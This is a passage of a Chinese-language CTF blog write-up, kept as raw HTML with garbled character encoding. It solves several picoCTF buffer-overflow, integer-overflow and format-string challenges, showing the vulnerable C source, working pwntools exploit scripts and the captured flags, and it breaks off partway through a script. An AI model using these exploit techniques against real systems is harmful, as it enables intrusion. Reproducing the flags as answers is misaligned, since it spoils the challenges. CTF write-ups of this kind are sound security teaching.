win_addr <span class="token operator">=</span> <span class="token number">0x080491F6</span>

payload <span class="token operator">+=</span> <span class="token string">b"A"</span> <span class="token operator">*</span> offset
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>win_addr<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">picoCTF&#123;addr3ss3s_ar3_3asy_6462ca2d&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="buffer-overflow-2">buffer overflow 2</h1><p>å’Œå‰å…©é¡Œä¸€æ¨£ï¼Œå…ˆçœ‹çœ‹ä»£ç¢¼ã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFSIZE</span> <span class="token expression"><span class="token number">100</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">FLAGSIZE</span> <span class="token expression"><span class="token number">64</span></span></span>

<span class="token keyword">void</span> <span class="token function">win</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> arg1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> arg2<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span>FLAGSIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
  FILE <span class="token operator">*</span>f <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>f <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s %s"</span><span class="token punctuation">,</span> <span class="token string">"Please create 'flag.txt' in this directory with your"</span><span class="token punctuation">,</span>
           <span class="token string">"own debugging flag.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">fgets</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> FLAGSIZE<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>arg1 <span class="token operator">!=</span> <span class="token number">0xCAFEF00D</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>arg2 <span class="token operator">!=</span> <span class="token number">0xF00DF00D</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span>BUFSIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token class-name">gid_t</span> gid <span class="token operator">=</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setresgid</span><span class="token punctuation">(</span>gid<span class="token punctuation">,</span> gid<span class="token punctuation">,</span> gid<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please enter your string: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€™æ¬¡å’Œå‰é¢é‚£é¡Œå·®ä¸å¤šï¼Œä¹Ÿæ˜¯å€‹ ret2winï¼Œä½†æ˜¯å®ƒå¤šäº†ä¸€å€‹æª¢æŸ¥æ¢ä»¶ï¼Œè¦åˆ¤æ–· arg1 å’Œ arg2 çš„å€¼æ˜¯å¦ç‚º 0xCAFEF00D å’Œ 0xF00DF00Dï¼Œæ‰€ä»¥åœ¨æ§‹é€  ROP Chain çš„æ™‚å€™è¦è¨˜å¾—æŠŠé€™å…©å€‹çš„å€¼ä¸²æ¥ä¸Šå»ã€‚æ¥ä¸‹ä¾†å°±é–‹å§‹ç·¨å¯« Exploit å§ã€‚</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"saturn.picoctf.net"</span><span class="token punctuation">,</span> <span class="token number">56229</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">b""</span>
offset <span class="token operator">=</span> <span class="token number">112</span>
win_addr <span class="token operator">=</span> <span class="token number">0x08049296</span>
arg1 <span class="token operator">=</span> <span class="token number">0xCAFEF00D</span>
arg2 <span class="token operator">=</span> <span class="token number">0xF00DF00D</span>

<span class="token comment"># p32(win_addr) is the return address for vuln() function</span>
<span class="token comment"># p32(0) is the return address for win() function to make the program execute normally</span>
payload <span class="token operator">+=</span> <span class="token string">b"A"</span> <span class="token operator">*</span> offset <span class="token operator">+</span> p32<span class="token punctuation">(</span>win_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>arg1<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>arg2<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è‡³æ–¼ç‚ºç”šéº¼ä¸­é–“è¦å¤šåŠ ä¸€å€‹ p32(0)ï¼Œæˆ‘ç›´æ¥å¯«åœ¨è¨»è§£ä¸­äº†ã€‚</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">picoCTF&#123;argum3nt5_4_d4yZ_3c04eab0&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="two-sum">two-sum</h1><p>å…ˆçœ‹é¡Œç›®çš„ä»£ç¢¼ã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">addIntOvf</span><span class="token punctuation">(</span><span class="token keyword">int</span> result<span class="token punctuation">,</span> <span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    result <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> b <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> result <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> b <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> result <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> num1<span class="token punctuation">,</span> num2<span class="token punctuation">,</span> sum<span class="token punctuation">;</span>
    FILE <span class="token operator">*</span>flag<span class="token punctuation">;</span>
    <span class="token keyword">char</span> c<span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"n1 > n1 + n2 OR n2 > n1 + n2 \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"What two positive numbers can make this possible: \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>num1<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>num2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You entered %d and %d\n"</span><span class="token punctuation">,</span> num1<span class="token punctuation">,</span> num2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        sum <span class="token operator">=</span> num1 <span class="token operator">+</span> num2<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">addIntOvf</span><span class="token punctuation">(</span>sum<span class="token punctuation">,</span> num1<span class="token punctuation">,</span> num2<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No overflow\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">addIntOvf</span><span class="token punctuation">(</span>sum<span class="token punctuation">,</span> num1<span class="token punctuation">,</span> num2<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You have an integer overflow\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>num1 <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">||</span> num2 <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            flag <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"flag not found: please run this on the server\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token function">fgets</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"YOUR FLAG IS: %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>à«å–®ä¾†èªªå°±æ˜¯è¦è¼¸å…¥å…©å€‹æ•¸å­—è®“ä»–ç›¸åŠ å¾Œæœƒ overflowã€‚æˆ‘å€‘çŸ¥é“ä¸€å€‹ Integer çš„ä¸Šé™æ˜¯<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>31</mn></msup><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{31}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.8974em;vertical-align:-.0833em"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222em"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:.2222em"></span></span><span class="base"><span class="strut" style="height:.6444em"></span><span class="mord">1</span></span></span></span>ï¼Œä¹Ÿå°±æ˜¯ 2147483647ï¼Œæ‰€ä»¥è®“é€™å€‹æ•¸å­—å†åŠ ä¸Š 1 å°±æœƒ overflowï¼Œåˆ©ç”¨é€™å€‹åŸç†ï¼Œæˆ‘å€‘ç›´æ¥ç”¨ Netcat é€£æ¥åˆ°é¡Œç›®ï¼Œè¼¸å…¥ 2147483647 å’Œ 1ï¼Œç²å¾— Flagã€‚</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">picoCTF&#123;Tw0_Sum_Integer_Bu773R_0v3rfl0w_bc0adfd1&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="format-string-0">format string 0</h1><p>å…ˆé€£æ¥åˆ°é¡Œç›®ï¼Œç„¶å¾Œçœ‹ä¸€ä¸‹é¡Œç›®é•·æ€æ¨£ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">â”Œâ”€â”€<span class="token punctuation">(</span>kaliã‰¿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
â””â”€$ <span class="token function">nc</span> mimas.picoctf.net <span class="token number">57925</span>

Welcome to our newly-opened burger place Pico 'n Patty<span class="token operator">!</span> Can you <span class="token builtin class-name">help</span> the picky customers <span class="token function">find</span> their favorite burger?
Here comes the first customer Patrick <span class="token function">who</span> wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr4d_Cheese, Bac0n_D3luxe
Enter your recommendation:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘åœ¨æ¸¬è©¦é¡Œç›®æ¼æ´çš„æ™‚å€™è¼¸å…¥äº†ä¸€å † jï¼Œçµæœå°±ç›´æ¥å¾—åˆ° flag äº† XDã€‚</p><p><img src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/24/9/image_c66965b327bfcda4b0d23b31fca87bfe.png" alt="Pwned"></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">picoCTF&#123;7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="format-string-1">format string 1</h1><p>ä¾†çœ‹çœ‹é¡Œç›®çš„ source codeã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>


<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> secret1<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> flag<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> secret2<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token comment">// Read in first secret menu item</span>
  FILE <span class="token operator">*</span>fd <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"secret-menu-item-1.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"'secret-menu-item-1.txt' file not found, aborting.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span>secret1<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// Read in the flag</span>
  fd <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"'flag.txt' file not found, aborting.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// Read in second secret menu item</span>
  fd <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"secret-menu-item-2.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"'secret-menu-item-2.txt' file not found, aborting.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span>secret2<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> fd<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Give me your order and I'll read it back to you:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"24s"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Here's your order: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Bye!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥æ˜é¡¯åœ°çœ‹åˆ°åœ¨ç¬¬ 36 è¡Œé‚£é‚Šçš„<code>printf(buf)</code>æ˜¯æ²’æœ‰åŠ ä¸Šæ ¼å¼åŒ–å­—ç¬¦çš„ï¼Œæ‰€ä»¥é€™é‚Šæœ‰ä¸€å€‹å¾ˆæ˜é¡¯çš„ format string vulnerabilityã€‚æˆ‘å€‘ç”¨ netcat é€£æ¥é¡Œç›®çœ‹çœ‹ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> mimas.picoctf.net <span class="token number">53267</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é€£ä¸Šé¡Œç›®å¾Œç™¼ç¾ä»–èªª Give me your order and Iâ€™ll read it back to youï¼Œæ‰€ä»¥æˆ‘å€‘å˜—è©¦è¼¸å…¥<code>%p</code>å¾Œç™¼ç¾ä»–æœƒè¼¸å‡ºä¸€å€‹åå…­é€²ä½çš„æ±è¥¿ã€‚ä»¥ä¸‹æ˜¯é¡Œç›®çš„è¼¸å‡ºã€‚</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Here's your order: 0x402118
Bye!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>é€™çœ‹èµ·ä¾†å¯ä»¥æŠŠå®ƒè½‰å›å­—ä¸²ï¼Œä¸¦ä¸”å¦‚æœå¤šè¼¸å…¥å¹¾å€‹<code>%p</code>æ‡‰è©²å°±èƒ½æŠŠ Flag çµ¦ Leak å‡ºä¾†ã€‚æˆ‘å¯«äº†ä¸€å€‹ Exploitï¼Œå»å˜—è©¦ç²å– Flagã€‚åœ¨è…³æœ¬ä¸­ä¹‹æ‰€ä»¥è¦æŠŠæ¯ä¸€æ®µåå…­é€²ä½è½‰å›çš„å­—ä¸²å‰å¾Œç¿»è½‰ï¼Œæ˜¯å› ç‚ºé¡Œç›®å‰›å‰›æœ‰èªª&quot;Iâ€™ll read it back to you&quot;ï¼Œæ‰€ä»¥æ¨æ¸¬ä»–æ‡‰è©²æ˜¯åè‘—éä¾†è¼¸å‡ºçš„ã€‚Exploit å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes

r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"mimas.picoctf.net"</span><span class="token punctuation">,</span> <span class="token number">53267</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"%p"</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">20</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Here's your order: "</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Bye!"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>removesuffix<span class="token punctuation">(</span><span class="token string">"Bye!"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span>

flag <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> res<span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
